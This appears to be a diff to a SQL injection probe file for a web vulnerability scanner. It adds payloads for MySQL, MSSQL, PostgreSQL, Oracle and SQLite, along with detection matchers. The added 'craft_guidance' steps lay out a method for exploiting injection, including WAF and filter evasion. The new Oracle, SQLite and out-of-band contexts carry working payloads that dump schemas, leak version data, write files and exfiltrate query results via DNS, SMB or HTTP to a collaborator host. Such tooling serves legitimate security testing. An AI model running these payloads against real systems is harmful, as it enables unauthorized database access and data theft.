@@ -1,5 +1,15 @@
 {
   "category": "sqli",
+  "craft_guidance": [
+    "1. IDENTIFY CONTEXT: Determine if input lands in WHERE clause, ORDER BY, INSERT VALUES, or LIMIT. Each needs different break characters.",
+    "2. DETECT DB ENGINE: Use vendor-specific errors or functions — @@version (MSSQL), version() (MySQL/PG), sqlite_version() (SQLite), banner (Oracle).",
+    "3. CHOOSE TECHNIQUE by visibility: Error-based (fastest) > UNION (data extraction) > Boolean blind (slow but reliable) > Time-based (last resort) > OOB DNS (when no output at all).",
+    "4. UNION EXPLOITATION: Find column count with ORDER BY N (increment until error), then UNION SELECT NULL,NULL,...,NULL to match. Replace NULLs one-by-one with data extraction functions.",
+    "5. BLIND EXTRACTION: Use SUBSTRING(value,pos,1) with binary search on ASCII values. For time-based, calibrate delay against baseline latency (+2s minimum delta).",
+    "6. WAF BYPASS CHAIN: Try in order — inline comments (/*!50000 SELECT*/), case variation (sElEcT), whitespace alternatives (/**/ or %0a), double encoding (%2527), concat char-by-char (CHAR(83)+CHAR(69)...).",
+    "7. FILTER EVASION: If quotes blocked, use hex (0x61646D696E), CHAR(), or numeric comparison. If spaces blocked, use /**/ or %09 (tab). If keywords blocked, use synonyms (COALESCE vs IF, CASE vs IIF).",
+    "8. OOB EXFILTRATION: MySQL LOAD_FILE+INTO OUTFILE, MSSQL xp_dirtree/xp_fileexist to UNC path, PostgreSQL COPY TO PROGRAM, Oracle UTL_HTTP.REQUEST."
+  ],
   "contexts": {
     "mssql": {
       "description": "SQL injection probes targeting Microsoft SQL Server via IIS/ASP.NET stacks",
@@ -90,9 +100,11 @@
         },
         {
           "payload": "{{baseline}} AND 1=2 UNION SELECT 1,version(),3--",
-          "description": "MySQL version extraction via UNION",
+          "description": "MySQL version extraction via UNION — look for MySQL/MariaDB version pattern in response body delta",
           "matchers": [
-            {"type": "regex", "pattern": "[0-9]+\\.[0-9]+\\.[0-9]+"}
+            {"type": "status", "status": [200]},
+            {"type": "length_diff", "min_diff": 5},
+            {"type": "regex", "pattern": "\\b[0-9]+\\.[0-9]+\\.[0-9]+-?(MariaDB|ubuntu|log|debian|cll)?"}
           ],
           "severity": "high",
           "confidence_boost": 70,
@@ -147,13 +159,13 @@
         },
         {
           "payload": "{{baseline}}' AND 1=1--",
-          "description": "PostgreSQL boolean-based true condition",
+          "description": "PostgreSQL boolean-based true condition — baseline-like response with no error confirms query parsing; pair with AND 1=2 for differential confirmation",
           "matchers": [
-            {"type": "length_diff", "min_diff": 0},
-            {"type": "not_word", "words": ["error", "exception"]}
+            {"type": "status", "status": [200]},
+            {"type": "not_word", "words": ["error", "exception", "syntax"]}
           ],
-          "severity": "medium",
-          "confidence_boost": 20,
+          "severity": "info",
+          "confidence_boost": 10,
           "variables": {}
         }
       ]
@@ -165,18 +177,20 @@
       "probes": [
         {
           "payload": "{{baseline}}'",
-          "description": "Quote break to trigger generic SQL error",
+          "description": "Quote break to trigger generic SQL error — 500 alone is weak; combined with SQL-related error keywords for higher confidence",
           "matchers": [
-            {"type": "status", "status": [500]}
+            {"type": "status", "status": [500]},
+            {"type": "word", "words": ["sql", "syntax", "query", "unterminated", "quotation", "mysql", "postgres", "oracle", "sqlite", "odbc", "jdbc"], "condition": "or"}
           ],
           "severity": "medium",
-          "confidence_boost": 25,
+          "confidence_boost": 35,
           "variables": {}
         },
         {
           "payload": "{{baseline}} OR 1=1--",
           "description": "Classic OR 1=1 to expand result set",
           "matchers": [
+            {"type": "status", "status": [200]},
             {"type": "length_diff", "min_diff": 200}
           ],
           "severity": "medium",
@@ -192,10 +206,10 @@
       "probes": [
         {
           "payload": "{{baseline}} AND 1=1",
-          "description": "Boolean true condition (should return same as baseline)",
+          "description": "Boolean true condition (should return same as baseline) — establishes true-case for differential with AND 1=2",
           "matchers": [
             {"type": "status", "status": [200]},
-            {"type": "word_count_diff", "min_diff": 0}
+            {"type": "not_word", "words": ["error", "syntax", "exception"]}
           ],
           "severity": "info",
           "confidence_boost": 0,
@@ -240,9 +254,9 @@
       "probes": [
         {
           "payload": "{{baseline}}; WAITFOR DELAY '0:0:3'--",
-          "description": "MSSQL time-based blind (3 second delay)",
+          "description": "MSSQL time-based blind (3 second delay) — timing must exceed 2800ms to reduce false positives from slow servers",
           "matchers": [
-            {"type": "timing", "min_ms": 2500}
+            {"type": "timing", "min_ms": 2800}
           ],
           "severity": "high",
           "confidence_boost": 45,
@@ -250,9 +264,9 @@
         },
         {
           "payload": "{{baseline}} AND SLEEP(3)-- -",
-          "description": "MySQL time-based blind (3 second delay)",
+          "description": "MySQL time-based blind (3 second delay) — timing must exceed 2800ms to reduce false positives from slow servers",
           "matchers": [
-            {"type": "timing", "min_ms": 2500}
+            {"type": "timing", "min_ms": 2800}
           ],
           "severity": "high",
           "confidence_boost": 45,
@@ -260,9 +274,9 @@
         },
         {
           "payload": "{{baseline}}; SELECT pg_sleep(3)--",
-          "description": "PostgreSQL time-based blind (3 second delay)",
+          "description": "PostgreSQL time-based blind (3 second delay) — timing must exceed 2800ms to reduce false positives from slow servers",
           "matchers": [
-            {"type": "timing", "min_ms": 2500}
+            {"type": "timing", "min_ms": 2800}
           ],
           "severity": "high",
           "confidence_boost": 45,
@@ -432,6 +446,144 @@
           ],
           "severity": "high",
           "confidence_boost": 40,
+          "variables": {}
+        }
+      ]
+    },
+    "oracle": {
+      "description": "SQL injection probes targeting Oracle Database",
+      "tech_match": ["Oracle", "Java", "WebLogic", "OracleDB"],
+      "param_match": ["id", "uid", "pid", "num", "page", "idx", "index", "cat", "item_id", "user_id", "order_id"],
+      "probes": [
+        {
+          "payload": "{{baseline}}'",
+          "description": "Quote break to trigger Oracle ORA- syntax error",
+          "matchers": [
+            {"type": "status", "status": [500]},
+            {"type": "word", "words": ["ORA-", "oracle", "TNS:", "PLS-"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
+          "description": "Oracle error-based injection via CTXSYS.DRITHSX.SN -- leaks Oracle version in error message",
+          "matchers": [
+            {"type": "status", "status": [500]},
+            {"type": "word", "words": ["DRG-", "ORA-", "Oracle Database"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
+          "description": "Oracle error-based via UTL_INADDR -- DNS resolution error leaks query output",
+          "matchers": [
+            {"type": "status", "status": [500]},
+            {"type": "word", "words": ["ORA-29257", "ORA-06512", "host not found"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}; SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),{{sleep}}) ELSE NULL END FROM dual--",
+          "description": "Oracle time-based blind injection via DBMS_PIPE.RECEIVE_MESSAGE",
+          "matchers": [
+            {"type": "timing", "min_ms": 4000}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    },
+    "oob_exfil": {
+      "description": "Out-of-band SQL injection via DNS exfiltration -- uses database-specific functions to trigger DNS lookups to attacker-controlled domain (requires Collaborator)",
+      "tech_match": ["MySQL", "MSSQL", "Oracle"],
+      "param_match": ["id", "uid", "pid", "num", "page", "idx", "index", "cat", "item_id", "user_id", "order_id"],
+      "probes": [
+        {
+          "payload": "{{baseline}}' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.{{collaborator}}\\\\a'))-- -",
+          "description": "MySQL OOB via LOAD_FILE -- triggers DNS lookup with version() as subdomain to Collaborator (requires FILE privilege)",
+          "matchers": [
+            {"type": "collaborator", "protocol": "dns"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}'; EXEC master..xp_dirtree '\\\\{{collaborator}}\\a'--",
+          "description": "MSSQL OOB via xp_dirtree -- triggers SMB/DNS lookup to Collaborator domain",
+          "matchers": [
+            {"type": "collaborator", "protocol": "dns"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}' AND 1=UTL_HTTP.REQUEST('http://{{collaborator}}/oob')--",
+          "description": "Oracle OOB via UTL_HTTP.REQUEST -- triggers HTTP request to Collaborator (requires ACL permission)",
+          "matchers": [
+            {"type": "collaborator", "protocol": "http"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "sqlite": {
+      "description": "SQL injection probes targeting SQLite -- commonly found in embedded systems, mobile backends, and lightweight web apps",
+      "tech_match": ["SQLite", "Python", "Flask", "Django", "PHP"],
+      "param_match": ["id", "uid", "pid", "num", "page", "idx", "index", "cat", "item_id", "user_id", "order_id"],
+      "probes": [
+        {
+          "payload": "{{baseline}}'",
+          "description": "Quote break to trigger SQLite syntax error",
+          "matchers": [
+            {"type": "status", "status": [500]},
+            {"type": "word", "words": ["sqlite", "SQLITE_ERROR", "unrecognized token", "near \""], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} UNION SELECT sqlite_version(),NULL,NULL-- -",
+          "description": "SQLite version extraction via UNION -- confirms SQLite backend and injection",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "regex", "pattern": "3\\.[0-9]+\\.[0-9]+"}
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE type='table'-- -",
+          "description": "SQLite schema extraction via sqlite_master -- dumps CREATE TABLE statements",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "words": ["CREATE TABLE", "CREATE INDEX"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}'; ATTACH DATABASE '/tmp/swk_probe.db' AS swk-- -",
+          "description": "SQLite ATTACH DATABASE probe -- tests for file write capability (detection only, writes to tmp)",
+          "matchers": [
+            {"type": "status", "status": [200, 500]},
+            {"type": "word", "words": ["not authorized", "readonly", "ATTACH"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 55,
           "variables": {}
         }
       ]
